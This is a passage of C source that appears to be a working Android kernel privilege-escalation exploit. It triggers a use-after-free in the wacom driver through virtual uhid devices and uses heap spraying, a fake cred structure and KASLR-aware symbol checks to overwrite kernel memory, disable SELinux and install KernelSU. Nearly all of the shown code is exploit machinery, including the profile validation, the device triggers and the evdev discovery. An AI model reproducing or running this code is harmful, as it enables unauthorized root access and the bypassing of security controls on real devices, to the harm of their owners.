    p->selinux_policycap = 0;
    p->hal_patch_enable = 1;
    snprintf(p->ksu_backend, sizeof(p->ksu_backend), "auto");
    snprintf(p->hal_patch_domains, sizeof(p->hal_patch_domains),
             "hal_audio_default hal_camera_default");

    s = pj_skip_ws(s, end);
    if (s >= end || *s != '{') {
        pj_err(err, errlen, "profile is not a JSON object");
        return -1;
    }
    s++;
    for (;;) {
        char key[96], val[512];
        int rc;
        int is_str;

        s = pj_skip_ws(s, end);
        if (s >= end) {
            pj_err(err, errlen, "unterminated profile object");
            return -1;
        }
        if (*s == '}') {
            s++;
            break;
        }
        if (pj_string(&s, end, key, sizeof(key)) != 0) {
            pj_err(err, errlen, "bad profile key");
            return -1;
        }
        s = pj_skip_ws(s, end);
        if (s >= end || *s != ':') {
            pj_err(err, errlen, "missing ':' after %s", key);
            return -1;
        }
        s = pj_skip_ws(s + 1, end);
        if (s < end && (*s == '{' || *s == '[')) {
            if (pj_skip_container(&s, end) != 0) {
                pj_err(err, errlen, "bad container value for %s", key);
                return -1;
            }
            rc = 0; /* unknown nested metadata: ignore */
        } else {
            is_str = s < end && *s == '"';
            if (is_str) {
                if (pj_string(&s, end, val, sizeof(val)) != 0) {
                    pj_err(err, errlen, "bad string value for %s", key);
                    return -1;
                }
                rc = pj_apply_str(p, key, val, err, errlen);
            } else {
                if (pj_token(&s, end, val, sizeof(val)) != 0) {
                    pj_err(err, errlen, "bad value for %s", key);
                    return -1;
                }
                rc = pj_apply_num(p, key, val, err, errlen);
                if (rc == 1)
                    rc = pj_apply_str(p, key, val, err, errlen);
                if (rc == 1)
                    rc = 0; /* unknown key (metadata): ignore */
            }
        }
        if (rc < 0)
            return -1;
        s = pj_skip_ws(s, end);
        if (s < end && *s == ',') {
            s++;
            continue;
        }
        if (s < end && *s == '}') {
            s++;
            break;
        }
        pj_err(err, errlen, "expected ',' or '}' after %s", key);
        return -1;
    }
    s = pj_skip_ws(s, end);
    if (s != end) {
        pj_err(err, errlen, "trailing data after profile object");
        return -1;
    }
    return 0;
}

static int profile_field_isset(const char *base, const struct pj_num *f) {
    if (f->width == 4) {
        unsigned int v;
        memcpy(&v, base + f->off, sizeof(v));
        return v != 0xffffffffu;
    } else {
        unsigned long long v;
        memcpy(&v, base + f->off, sizeof(v));
        return v != ~0ULL;
    }
}

static int profile_validate(struct cve99491_profile *p, char *err,
                            size_t errlen) {
    unsigned int dev_offs[][2] = {
        { p->input_dev_evbit_off, 8 },
        { p->input_dev_swbit_off, 8 },
        { p->input_dev_grab_off, 8 },
        { p->input_dev_event_lock_off, 4 },
        { p->input_dev_num_vals_off, 4 },
        { p->input_dev_max_vals_off, 4 },
        { p->input_dev_vals_off, 8 },
        { p->input_dev_absbit_off, 8 },
        { p->input_dev_absinfo_off, 8 },
        { p->input_dev_event_off, 8 },
        { p->input_dev_hlist_off, 16 },
        { p->input_dev_inhibited_off, 1 },
    };

    for (size_t i = 0; i < sizeof(pj_nums) / sizeof(pj_nums[0]); i++) {
        if (!profile_field_isset((const char *)p, &pj_nums[i])) {
            pj_err(err, errlen, "missing profile key: %s", pj_nums[i].key);
            return -1;
        }
    }
    for (size_t i = 0; i < sizeof(pj_strs) / sizeof(pj_strs[0]); i++) {
        const char *v = (const char *)p + pj_strs[i].off;
        if (!v[0]) {
            pj_err(err, errlen, "missing profile key: %s", pj_strs[i].key);
            return -1;
        }
    }
    if (p->format != 1) {
        pj_err(err, errlen, "unsupported profile format %u", p->format);
        return -1;
    }
    if (strcmp(p->arch, "aarch64") && strcmp(p->arch, "arm64")) {
        pj_err(err, errlen, "unsupported profile arch: %s", p->arch);
        return -1;
    }
    if (p->cap_last_cap < 1 || p->cap_last_cap > 62 ||
        p->cap_full_mask != ((1ULL << (p->cap_last_cap + 1)) - 1)) {
        pj_err(err, errlen, "inconsistent cap_last_cap/cap_full_mask");
        return -1;
    }
    if (p->cred_bytes == 0 || p->cred_bytes > CVE99491_CRED_MAX ||
        p->cred_rcu_off + p->cred_rcu_size > p->cred_bytes ||
        p->cred_security_off + 8 > p->cred_bytes ||
        p->cred_uid_off + 4 > p->cred_bytes ||
        p->cred_euid_off + 4 > p->cred_bytes ||
        p->cred_cap_effective_off + 8 > p->cred_bytes) {
        pj_err(err, errlen, "cred layout exceeds cred_bytes");
        return -1;
    }
    if (p->input_dev_size == 0 ||
        p->c_off_d + p->input_dev_size > 4096 ||
        p->c_off_e + 16 > 4096 ||
        p->c_off_fake + p->cred_bytes > 4096) {
        pj_err(err, errlen, "payload layout exceeds the input_buf");
        return -1;
    }
    if (p->input_handle_size == 0 ||
        p->input_handle_events_off + 8 > p->input_handle_size ||
        p->input_handle_dev_off + 8 > p->input_handle_size ||
        p->input_handle_handler_off + 8 > p->input_handle_size) {
        pj_err(err, errlen, "input_handle layout exceeds input_handle_size");
        return -1;
    }
    for (size_t i = 0; i < sizeof(dev_offs) / sizeof(dev_offs[0]); i++) {
        if (dev_offs[i][0] + dev_offs[i][1] > p->input_dev_size) {
            pj_err(err, errlen, "input_dev field exceeds input_dev_size");
            return -1;
        }
    }
    if (p->selinux_initialized_off < p->selinux_enforcing_off ||
        p->selinux_initialized_off >= 4) {
        pj_err(err, errlen, "unsupported selinux_state layout");
        return -1;
    }
    {
        const char *dom = p->selinux_shell_domain;
        size_t dn = strlen(dom);

        if (dn < 8 || dn >= sizeof(p->selinux_shell_domain) ||
            strncmp(dom, "u:r:", 4) != 0 ||
            strcmp(dom + dn - 3, ":s0") != 0) {
            pj_err(err, errlen, "invalid selinux_shell_domain");
            return -1;
        }
        for (size_t i = 4; i + 3 < dn; i++) {
            char c = dom[i];

            if (!((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') ||
                  (c >= '0' && c <= '9') || c == '_' || c == '.')) {
                pj_err(err, errlen, "invalid selinux_shell_domain");
                return -1;
            }
        }
    }
    if (p->pm_binder_lib[0] || p->pm_service[0] || p->pm_interface[0]) {
        if (!p->pm_binder_lib[0] || !p->pm_service[0] ||
            !p->pm_interface[0] ||
            p->pm_txn_get_application_info < 1 ||
            p->pm_txn_get_application_info > 0xffff ||
            p->pm_txn_get_package_info < 1 ||
            p->pm_txn_get_package_info > 0xffff ||
            p->pm_user_id > 999) {
            pj_err(err, errlen, "invalid PackageManager binder ABI values");
            return -1;
        }
    }
    if (p->spray_pairs < 1 || p->spray_pairs > CVE99491_SPRAY_PAIRS_MAX ||
        p->spray_len < p->input_dev_size) {
        pj_err(err, errlen, "invalid spray geometry");
        return -1;
    }
    if (p->spray_burst_min < 32 || p->spray_burst_min > 65536 ||
        p->spray_burst_step < 8 || p->spray_burst_step > 4096 ||
        p->spray_wait_ms > 5000 ||
        p->spray_hold_wait_ms > 10000 ||
        p->spray_fill > 4096 ||
        p->spray_trigger_rounds < 1 || p->spray_trigger_rounds > 16 ||
        p->spray_respray_rounds < 1 || p->spray_respray_rounds > 64 ||
        p->spray_cpu > 63 ||
        (p->spray_skb_req &&
         (p->spray_skb_req < p->spray_len || p->spray_skb_req > 8192))) {
        pj_err(err, errlen, "invalid reclaim knobs");
        return -1;
    }
    if (p->uhid_serial_read_base_off > p->uhid_waitq_self ||
        (p->uhid_waitq_self - p->uhid_serial_read_base_off) % 4 != 0 ||
        p->uhid_worker_func_off < p->uhid_worker_off ||
        p->uhid_worker_func_off < p->uhid_serial_read_base_off ||
        (p->uhid_worker_func_off - p->uhid_serial_read_base_off) % 4 != 0) {
        pj_err(err, errlen, "invalid uhid leak indices");
        return -1;
    }
    /* --- port-added fields ------------------------------------------- */
    if (p->kaslr_align < 0x1000 || p->kaslr_align > 0x40000000 ||
        (p->kaslr_align & (p->kaslr_align - 1)) != 0) {
        pj_err(err, errlen, "invalid kaslr_align");
        return -1;
    }
    if ((p->stext && !p->etext) || (!p->stext && p->etext)) {
        pj_err(err, errlen, "stext/etext must be set together");
        return -1;
    }
    if (p->stext) {
        static const char *text_syms[] = {
            "sym_uhid_worker", "sym_ihe_default", "sym_inject_event",
        };
        static const char *data_syms[] = {
            "sym_selinux_state", "sym_init_cred", "sym_per_cpu_offset",
            "sym_runqueues", "sym_input_dev_list",
        };
        unsigned long long text[3], data[5];

        text[0] = p->sym_uhid_worker;
        text[1] = p->sym_ihe_default;
        text[2] = p->sym_inject_event;
        data[0] = p->sym_selinux_state;
        data[1] = p->sym_init_cred;
        data[2] = p->sym_per_cpu_offset;
        data[3] = p->sym_runqueues;
        data[4] = p->sym_input_dev_list;
        if ((p->stext >> 48) != 0xffff || (p->etext >> 48) != 0xffff ||
            p->stext >= p->etext ||
            p->etext - p->stext > 64ULL * 1024 * 1024) {
            pj_err(err, errlen, "invalid stext/etext range");
            return -1;
        }
        for (size_t i = 0; i < 3; i++) {
            if ((text[i] >> 48) != 0xffff || text[i] & 3 ||
                text[i] < p->stext || text[i] >= p->etext) {
                pj_err(err, errlen, "%s outside .text", text_syms[i]);
                return -1;
            }
        }
        for (size_t i = 0; i < 5; i++) {
            if ((data[i] >> 48) != 0xffff || data[i] & 3 ||
                data[i] < p->etext ||
                data[i] >= p->stext + 0x20000000ULL) {
                pj_err(err, errlen, "%s outside kernel data window",
                       data_syms[i]);
                return -1;
            }
        }
    }
    if (strcmp(p->ksu_backend, "auto") && strcmp(p->ksu_backend, "asset") &&
        strcmp(p->ksu_backend, "manager")) {
        pj_err(err, errlen, "invalid ksu_backend: %s", p->ksu_backend);
        return -1;
    }
    if (p->hal_patch_enable > 1) {
        pj_err(err, errlen, "hal_patch_enable must be 0 or 1");
        return -1;
    }
    if (p->hal_patch_enable) {
        const char *d = p->hal_patch_domains;
        int names = 0, in_name = 0;
        size_t dn = strlen(d);

        if (dn == 0 || dn >= sizeof(p->hal_patch_domains)) {
            pj_err(err, errlen, "invalid hal_patch_domains");
            return -1;
        }
        for (size_t i = 0; i < dn; i++) {
            char c = d[i];

            if (c == ' ') {
                in_name = 0;
                continue;
            }
            if (!((c >= 'a' && c <= 'z') || (c >= '0' && c <= '9') || c == '_')) {
                pj_err(err, errlen, "invalid hal_patch_domains");
                return -1;
            }
            if (!in_name) {
                if (c < 'a' || c > 'z') {
                    pj_err(err, errlen, "invalid hal_patch_domains");
                    return -1;
                }
                in_name = 1;
                names++;
            }
        }
        if (names < 1 || names > 8) {
            pj_err(err, errlen, "hal_patch_domains needs 1..8 domains");
            return -1;
        }
    }
    return 0;
}

static int profile_load(const char *path, struct cve99491_profile *p,
                        char *err, size_t errlen) {
    FILE *f;
    char *buf;
    size_t n;
    int rc;

    f = fopen(path, "rb");
    if (!f) {
        pj_err(err, errlen, "cannot open %s: %s", path, strerror(errno));
        return -1;
    }
    buf = malloc(64 * 1024 + 1);
    if (!buf) {
        fclose(f);
        pj_err(err, errlen, "out of memory reading %s", path);
        return -1;
    }
    n = fread(buf, 1, 64 * 1024, f);
    if (ferror(f)) {
        pj_err(err, errlen, "cannot read %s", path);
        fclose(f);
        free(buf);
        return -1;
    }
    if (!feof(f)) {
        pj_err(err, errlen, "profile %s is too large", path);
        fclose(f);
        free(buf);
        return -1;
    }
    fclose(f);
    buf[n] = 0;
    rc = profile_parse(buf, n, p, err, errlen);
    free(buf);
    if (rc == 0) {
        /* Missing pm_* keys fall back to the known-good values, with an
         * explicit warning so the fallback is never mistaken for a
         * profile-verified ABI. */
        if (cve99491_profile_pm_assumed(p))
            fprintf(stderr, "[!] pm_* missing in profile; using ASSUMED "
                    "defaults\n");
        /* Optional reclaim knobs: a profile may omit them and keep these
         * generic defaults instead of failing. */
        if (!p->spray_burst_min)
            p->spray_burst_min = 512;
        if (!p->spray_burst_step)
            p->spray_burst_step = 64;
        if (!p->spray_hold_wait_ms)
            p->spray_hold_wait_ms = 10000;
        if (!p->spray_fill)
            p->spray_fill = 64;
        if (!p->spray_trigger_rounds)
            p->spray_trigger_rounds = 4;
        if (!p->spray_respray_rounds)
            p->spray_respray_rounds = 3;
        rc = profile_validate(p, err, errlen);
    }
    return rc;
}

/* Load the profile compiled from the generated profile.h.  Used when the
 * default workdir profile.json is absent; an explicit --profile path stays
 * fail-closed (a missing file is an error). */
static int profile_load_builtin(struct cve99491_profile *p, char *err,
                                size_t errlen) {
    cve99491_profile_builtin(p);
    if (cve99491_profile_pm_assumed(p))
        fprintf(stderr, "[!] pm_* missing in builtin profile; using ASSUMED "
                "defaults\n");
    return profile_validate(p, err, errlen);
}

/*
 * Fail-closed bridge between the compiled-in calibration and a runtime
 * --profile JSON: every calibrated value must be identical (label/verified
 * are informational, stext/etext only feed the build-time cross-check).
 * The binary is always rebuilt together with the JSON (build.sh regenerates
 * profile.h), so a drifting runtime JSON means a stale/foreign deploy and
 * must not be trusted with a chain that writes kernel memory.
 */
static int profile_compare_builtin(const struct cve99491_profile *p,
                                   char *err, size_t errlen) {
    struct cve99491_profile b;

    cve99491_profile_builtin(&b);
    for (size_t i = 0; i < sizeof(pj_nums) / sizeof(pj_nums[0]); i++) {
        const struct pj_num *f = &pj_nums[i];

        if (!strcmp(f->key, "verified"))
            continue;
        if (f->width == 4) {
            unsigned int a, c;
            memcpy(&a, (const char *)p + f->off, sizeof(a));
            memcpy(&c, (const char *)&b + f->off, sizeof(c));
            if (a != c) {
                pj_err(err, errlen, "runtime profile %s=%u != builtin %u",
                       f->key, a, c);
                return -1;
            }
        } else {
            unsigned long long a, c;
            memcpy(&a, (const char *)p + f->off, sizeof(a));
            memcpy(&c, (const char *)&b + f->off, sizeof(c));
            if (a != c) {
                pj_err(err, errlen, "runtime profile %s=%#llx != builtin %#llx",
                       f->key, a, c);
                return -1;
            }
        }
    }
    for (size_t i = 0; i < sizeof(pj_opt_nums) / sizeof(pj_opt_nums[0]); i++) {
        const struct pj_num *f = &pj_opt_nums[i];

        /* stext/etext are derived from the build-time reference table and
         * may legitimately be absent from the runtime JSON. */
        if (!strcmp(f->key, "stext") || !strcmp(f->key, "etext"))
            continue;
        if (f->width == 4) {
            unsigned int a, c;
            memcpy(&a, (const char *)p + f->off, sizeof(a));
            memcpy(&c, (const char *)&b + f->off, sizeof(c));
            if (a != c) {
                pj_err(err, errlen, "runtime profile %s=%u != builtin %u",
                       f->key, a, c);
                return -1;
            }
        } else {
            unsigned long long a, c;
            memcpy(&a, (const char *)p + f->off, sizeof(a));
            memcpy(&c, (const char *)&b + f->off, sizeof(c));
            if (a != c) {
                pj_err(err, errlen, "runtime profile %s=%#llx != builtin %#llx",
                       f->key, a, c);
                return -1;
            }
        }
    }
    for (size_t i = 0; i < sizeof(pj_strs) / sizeof(pj_strs[0]); i++) {
        const struct pj_str *f = &pj_strs[i];
        const char *a = (const char *)p + f->off;
        const char *c = (const char *)&b + f->off;

        if (!strcmp(f->key, "label"))
            continue;
        if (strcmp(a, c)) {
            pj_err(err, errlen, "runtime profile %s=\"%s\" != builtin \"%s\"",
                   f->key, a, c);
            return -1;
        }
    }
    for (size_t i = 0; i < sizeof(pj_opt_strs) / sizeof(pj_opt_strs[0]); i++) {
        const struct pj_str *f = &pj_opt_strs[i];
        const char *a = (const char *)p + f->off;
        const char *c = (const char *)&b + f->off;

        if (strcmp(a, c)) {
            pj_err(err, errlen, "runtime profile %s=\"%s\" != builtin \"%s\"",
                   f->key, a, c);
            return -1;
        }
    }
    return 0;
}

static int profile_check_runtime(const struct cve99491_profile *p,
                                 char *err, size_t errlen) {
    struct utsname u;
    long page = sysconf(_SC_PAGESIZE);

    if (uname(&u) != 0) {
        pj_err(err, errlen, "uname failed");
        return -1;
    }
    if (strcmp(u.release, p->release)) {
        pj_err(err, errlen, "profile release %s does not match running %s",
               p->release, u.release);
        return -1;
    }
    {
        int arch_ok = !strcmp(u.machine, p->arch) ||
            ((!strcmp(p->arch, "arm64") || !strcmp(p->arch, "aarch64")) &&
             (!strcmp(u.machine, "arm64") || !strcmp(u.machine, "aarch64")));

        if (!arch_ok) {
            pj_err(err, errlen, "profile arch %s does not match machine %s",
                   p->arch, u.machine);
            return -1;
        }
    }
    if (page <= 0 || (unsigned long)page != p->page_size) {
        pj_err(err, errlen, "profile page_size %u does not match %ld",
               p->page_size, page);
        return -1;
    }
    return 0;
}


/* --- KSU path validation and CLI/env overrides ----------------------- */

static int path_has_dotdot(const char *p) {
    const char *q = p;

    while ((q = strstr(q, "..")) != NULL) {
        if ((q == p || q[-1] == '/') && (q[2] == 0 || q[2] == '/'))
            return 1;
        q += 2;
    }
    return 0;
}

/* Absolute path under `prefix`; allow_equal also accepts the prefix itself. */
static int path_under(const char *p, const char *prefix, int allow_equal) {
    size_t n = strlen(prefix);

    if (!p[0] || p[0] != '/' || path_has_dotdot(p))
        return 0;
    if (strncmp(p, prefix, n) != 0)
        return 0;
    if (p[n] == 0)
        return allow_equal;
    if (prefix[n - 1] == '/' || p[n] == '/')
        return 1;
    return 0;
}

static int rel_path_ok(const char *p) {
    if (!p[0] || p[0] == '/' || path_has_dotdot(p))
        return 0;
    return 1;
}

static int simple_name_ok(const char *p) {
    if (!p[0] || strchr(p, '/') || strlen(p) > 63)
        return 0;
    return 1;
}

static int package_name_ok(const char *p) {
    size_t n = strlen(p);

    if (n < 3 || n > 95)
        return 0;
    for (size_t i = 0; i < n; i++) {
        char c = p[i];
        if (!((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') ||
              (c >= '0' && c <= '9') || c == '.' || c == '_'))
            return 0;
    }
    return 1;
}

static int profile_paths_validate(const struct cve99491_profile *p,
                                  char *err, size_t errlen) {
    if (!path_under(p->ksu_workdir, "/data/local/tmp/", 0)) {
        pj_err(err, errlen, "ksu_workdir must be under /data/local/tmp/");
        return -1;
    }
    if (!path_under(p->ksu_ksud_path, "/data/adb/", 0)) {
        pj_err(err, errlen, "ksu_ksud_path must be under /data/adb/");
        return -1;
    }
    if (!path_under(p->ksu_ksu_bin_dir, "/data/adb/", 0)) {
        pj_err(err, errlen, "ksu_ksu_bin_dir must be under /data/adb/");
        return -1;
    }
    if (!path_under(p->ksu_modules_dir, "/data/adb/", 0)) {
        pj_err(err, errlen, "ksu_modules_dir must be under /data/adb/");
        return -1;
    }
    if (!path_under(p->ksu_manager_apk_root, "/data/app", 1)) {
        pj_err(err, errlen, "ksu_manager_apk_root must be /data/app");
        return -1;
    }
    if (!package_name_ok(p->ksu_manager)) {
        pj_err(err, errlen, "invalid ksu_manager package name");
        return -1;
    }
    if (!simple_name_ok(p->ksu_module_name)) {
        pj_err(err, errlen, "invalid ksu_module_name");
        return -1;
    }
    if (!simple_name_ok(p->ksu_ksud_name)) {
        pj_err(err, errlen, "invalid ksu_ksud_name");
        return -1;
    }
    if (!rel_path_ok(p->ksu_lib_subpath) ||
        !rel_path_ok(p->ksu_lib_subpath_v8a)) {
        pj_err(err, errlen, "invalid KSU lib subpath");
        return -1;
    }
    return 0;
}

/* Bounded copy used by the CLI/env KSU-path overrides. */
static int profile_override_str(char *dst, size_t cap, const char *v) {
    size_t n;

    if (!v || !*v)
        return -1;
    n = strlen(v);
    if (n >= cap)
        return -1;
    memcpy(dst, v, n + 1);
    return 0;
}
/* Persistent progress log (survives a reboot). */
static int g_logfd = -1;
static long g_plog_t0;
static int g_plog_ts = -1;
static long now_ms(void) {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return ts.tv_sec * 1000LL + ts.tv_nsec / 1000000;
}
static void plog(const char *fmt, ...) {
    char b[256];
    char line[288];
    va_list ap;
    int n;
    if (g_logfd < 0)
        g_logfd = open(g_run_log,
                       O_WRONLY | O_CREAT | O_APPEND, 0644);
    if (g_logfd < 0)
        return;
    if (g_plog_ts < 0)
        g_plog_ts = getenv("CVE99491_TIMING") != NULL;
    va_start(ap, fmt);
    n = vsnprintf(b, sizeof(b), fmt, ap);
    va_end(ap);
    if (n <= 0)
        return;
    if (g_plog_ts) {
        if (!g_plog_t0)
            g_plog_t0 = now_ms();
        n = snprintf(line, sizeof(line), "[%5ldms] %s", now_ms() - g_plog_t0,
                     b);
        if (n > 0)
            (void)!write(g_logfd, line, (size_t)n);
    } else {
        (void)!write(g_logfd, b, (size_t)n);
    }
    (void)fsync(g_logfd);
}
#define PLOG(...) plog(__VA_ARGS__)

static int uhid_open(void) {
    int fd = open("/dev/uhid", O_RDWR | O_CLOEXEC | O_NONBLOCK);
    if (fd < 0) perror("open /dev/uhid");
    return fd;
}

static int uhid_create(int fd, const char *name, const char *phys,
                       unsigned pid, const unsigned char *rdesc, size_t rlen) {
    static struct uhid_event ev;
    memset(&ev, 0, sizeof(ev));
    ev.type = UHID_CREATE2;
    strncpy((char *)ev.u.create2.name, name, sizeof(ev.u.create2.name) - 1);
    if (phys)
        strncpy((char *)ev.u.create2.phys, phys, sizeof(ev.u.create2.phys) - 1);
    strncpy((char *)ev.u.create2.uniq, name, sizeof(ev.u.create2.uniq) - 1);
    memcpy(ev.u.create2.rd_data, rdesc, rlen);
    ev.u.create2.rd_size = rlen;
    ev.u.create2.bus = BUS_USB;
    ev.u.create2.vendor = WACOM_VID;
    ev.u.create2.product = pid;
    if (write(fd, &ev, sizeof(ev)) < 0) {
        perror("UHID_CREATE2");
        return -1;
    }
    return 0;
}

static int uhid_destroy(int fd) {
    struct uhid_event ev;
    memset(&ev, 0, sizeof(ev));
    ev.type = UHID_DESTROY;
    return write(fd, &ev, sizeof(ev)) < 0 ? -1 : 0;
}

/* Full-event INPUT2 write for the anchor: report id 1, InRange at data[1],
 * and the 4096-byte payload (fake structures live at fixed data offsets). */
static int uhid_input2(int fd, const unsigned char *payload, int inrange) {
    static struct uhid_event ev;
    memset(&ev, 0, sizeof(ev));
    ev.type = UHID_INPUT2;
    ev.u.input2.size = 6;
    if (payload)
        memcpy(ev.u.input2.data, payload, sizeof(ev.u.input2.data));
    ev.u.input2.data[0] = 0x01;           /* report id 1 */
    ev.u.input2.data[1] = inrange ? 1 : 0;/* InRange */
    return write(fd, &ev, sizeof(ev)) < 0 ? -1 : 0;
}

/* Raw INPUT2 write with an explicit report payload (pad trigger). */
static int uhid_input_raw(int fd, const unsigned char *data, size_t n) {
    static struct uhid_event ev;
    memset(&ev, 0, sizeof(ev));
    ev.type = UHID_INPUT2;
    ev.u.input2.size = n;
    memcpy(ev.u.input2.data, data, n);
    return write(fd, &ev, sizeof(ev)) < 0 ? -1 : 0;
}

static int pump_until_start(int fd, long deadline_ms) {
    struct uhid_event ev, rep;
    while (now_ms() < deadline_ms) {
        ssize_t n = read(fd, &ev, sizeof(ev));
        if (n < 0 && (errno == EAGAIN || errno == EWOULDBLOCK)) {
            usleep(5000);
            continue;
        }
        if (n <= 0)
            continue;
        if (ev.type == UHID_START)
            return 1;
        if (ev.type == UHID_GET_REPORT) {
            memset(&rep, 0, sizeof(rep));
            rep.type = UHID_GET_REPORT_REPLY;
            rep.u.get_report_reply.id = ev.u.get_report.id;
            write(fd, &rep, sizeof(rep));
        } else if (ev.type == UHID_SET_REPORT) {
            memset(&rep, 0, sizeof(rep));
            rep.type = UHID_SET_REPORT_REPLY;
            rep.u.set_report_reply.id = ev.u.set_report.id;
            write(fd, &rep, sizeof(rep));
        }
    }
    return 0;
}

/* Wait until the uhid queue drains (two consecutive EAGAIN reads). */
static int pump_drain(int fd, long deadline_ms) {
    struct uhid_event ev, rep;
    int idle = 0;
    while (now_ms() < deadline_ms) {
        ssize_t n = read(fd, &ev, sizeof(ev));
        if (n < 0 && (errno == EAGAIN || errno == EWOULDBLOCK)) {
            if (++idle >= 2)
                return 0;
            usleep(10000);
            continue;
        }
        idle = 0;
        if (n <= 0)
            continue;
        if (ev.type == UHID_GET_REPORT) {
            memset(&rep, 0, sizeof(rep));
            rep.type = UHID_GET_REPORT_REPLY;
            rep.u.get_report_reply.id = ev.u.get_report.id;
            write(fd, &rep, sizeof(rep));
        } else if (ev.type == UHID_SET_REPORT) {
            memset(&rep, 0, sizeof(rep));
            rep.type = UHID_SET_REPORT_REPLY;
            rep.u.set_report_reply.id = ev.u.set_report.id;
            write(fd, &rep, sizeof(rep));
        }
    }
    return -1;
}

/* Descriptor: Digitizer/Pen with ToolSerial usage at array index `index`.
 * The 32-bit field reads uhid_device + 88 + 4*index in
 * wacom_wac_pen_serial_enforce(). */
static size_t gen_rdesc(unsigned index, unsigned char *out) {
    static const unsigned char tpl[] = {
        0x05, 0x0d, 0x09, 0x02, 0xa1, 0x01,
        0x05, 0x0d, 0x09, 0x20, 0xa1, 0x00,
        0x85, 0x01,
        0x05, 0x0d, 0x09, 0x32, 0x15, 0x00, 0x25, 0x01,
        0x75, 0x08, 0x95, 0x01, 0x81, 0x02,
        0x05, 0x0d, 0x1a, 0x00, 0x01,
        0x2a, 0x00, 0x00,           /* Usage Maximum (patched) */
        0x09, 0x5b,
        0x15, 0x00, 0x27, 0xff, 0xff, 0xff, 0x7f,
        0x75, 0x20, 0x95, 0x01, 0x81, 0x02,
        0xc0, 0xc0
    };
    unsigned usage_max = 0x0100 + index - 1;
    memcpy(out, tpl, sizeof(tpl));
    for (size_t i = 0; i + 2 < sizeof(tpl); i++) {
        if (out[i] == 0x2a && out[i + 3] == 0x09 && out[i + 4] == 0x5b) {
            out[i + 1] = usage_max & 0xff;
            out[i + 2] = usage_max >> 8;
            break;
        }
    }
    return sizeof(tpl);
}

/* --- evdev node discovery ------------------------------------------- */

#define MAXEV 128
static int list_events(char names[MAXEV][16]) {
    DIR *d = opendir("/dev/input");
    int n = 0;
    struct dirent *e;
    if (!d)
        return 0;
    while ((e = readdir(d)) && n < MAXEV) {
        if (strncmp(e->d_name, "event", 5) == 0)
            snprintf(names[n++], 16, "%s", e->d_name);
    }
    closedir(d);
    return n;
}

/* Match one evdev node by its unique uhid phys string. */
static int event_phys_matches(const char *path, const char *phys) {
    char buf[64];
    int fd, rc;

    if (!phys || !*phys)
        return 1;
    fd = open(path, O_RDONLY | O_NONBLOCK | O_CLOEXEC);
    if (fd < 0)
        return 0;
    memset(buf, 0, sizeof(buf));
    rc = ioctl(fd, EVIOCGPHYS(sizeof(buf) - 1), buf);
    close(fd);
    return rc >= 0 && !strcmp(buf, phys);
}

static int find_new_event(char old[MAXEV][16], int nold, char *out, size_t outsz,
                          long timeout_ms, const char *phys) {
    long dl = now_ms() + timeout_ms;
    while (now_ms() < dl) {
        char cur[MAXEV][16];
        int n = list_events(cur);
        for (int i = 0; i < n; i++) {
            int seen = 0;
            char path[32];

            snprintf(path, sizeof(path), "/dev/input/%s", cur[i]);
            for (int j = 0; j < nold; j++)
                if (!strcmp(cur[i], old[j])) { seen = 1; break; }
            if ((phys && *phys) || !seen) {
                if (event_phys_matches(path, phys)) {
                    snprintf(out, outsz, "%s", path);
                    return 0;
                }
            }
        }
        usleep(10000);
    }
    return -1;
}

/* Read one MSC_SERIAL value from an open evdev fd (non-blocking). */
static int evdev_number(const char *name) {
    int n = 0;
    const char *p = name;

    while (*p && (*p < '0' || *p > '9'))
        p++;
    while (*p >= '0' && *p <= '9')
        n = n * 10 + (*p++ - '0');
    return n;
}

/*
 * The wacom probe allocates pen/touch/pad inputs but registers only the
 * type present in the descriptor; the touch node is named "... Finger".
 * Open it before the pad is created so its evdev handle keeps the touch
 * input_dev alive until our close() performs the kfree.
 */
static int find_touch_node(const char old[MAXEV][16], int nold,
                           char *out, size_t outsz, char *nm, size_t nmsz) {
    char cur[MAXEV][16], fresh[MAXEV][16];
    char first_path[32] = "", first_name[64] = "";
    int n = list_events(cur), m = 0;

    for (int i = 0; i < n; i++) {
        int seen = 0;

        for (int j = 0; j < nold; j++)
            if (!strcmp(cur[i], old[j])) {
                seen = 1;
                break;
            }
        if (!seen && m < MAXEV)
            snprintf(fresh[m++], 16, "%s", cur[i]);
    }
    for (int i = 0; i < m; i++)
        for (int j = i + 1; j < m; j++)
            if (evdev_number(fresh[j]) < evdev_number(fresh[i])) {
                char t[16];

                snprintf(t, sizeof(t), "%s", fresh[i]);
                snprintf(fresh[i], sizeof(fresh[i]), "%s", fresh[j]);
                snprintf(fresh[j], sizeof(fresh[j]), "%s", t);
            }
    for (int i = 0; i < m; i++) {
        char path[32], phys[64] = "", name[64] = "";
        int fd;

        snprintf(path, sizeof(path), "/dev/input/%s", fresh[i]);
        fd = open(path, O_RDONLY | O_NONBLOCK | O_CLOEXEC);
        if (fd < 0)
            continue;
        ioctl(fd, EVIOCGPHYS(sizeof(phys) - 1), phys);
        ioctl(fd, EVIOCGNAME(sizeof(name) - 1), name);
        close(fd);
        if (strcmp(phys, PHYS_COMMON) != 0)
            continue;
        if (!first_path[0]) {
            snprintf(first_path, sizeof(first_path), "%s", path);
            snprintf(first_name, sizeof(first_name), "%s", name);
        }
        if (strstr(name, "Finger") || strstr(name, "touch")) {
            snprintf(out, outsz, "%s", path);
            snprintf(nm, nmsz, "%s", name);
            return 0;
        }
    }
    if (first_path[0]) {
        snprintf(out, outsz, "%s", first_path);
        snprintf(nm, nmsz, "%s", first_name);
        return 0;
    }
    return -1;
}

/* --- CHAIN_DEBUG: read-only binding/trigger diagnostics (port) ------- */
/*
 * The pad-triggered UAF step needs the kernel's wacom driver to claim BOTH
 * UHID devices of our pair (same phys) and to map the pad's vendor usages
 * 0x0981/0x0986 to the touch-mute/report path.  If the vendor wacom module
 * differs, the pad report silently goes nowhere and the chain write never
 * executes even though the kmem oracle confirmed the reclaim.  These dumps
 * answer "was the pad bound to wacom, does its input node carry
 * SW_MUTE_DEVICE" without any kernel write or disassembly.
 */
static const char *path_last_component(const char *p) {
    const char *s = strrchr(p, '/');

    return s ? s + 1 : p;
}

static void dbg_dump_hid_bindings(const char *tag) {
    DIR *d = opendir("/sys/bus/hid/devices");
    struct dirent *e;

    printf("[dbg] %s hid: wacom_module=%d wacom_driver_dir=%d\n", tag,
           access("/sys/module/wacom", F_OK) == 0,
           access("/sys/bus/hid/drivers/wacom", F_OK) == 0);
    if (!d)
        return;
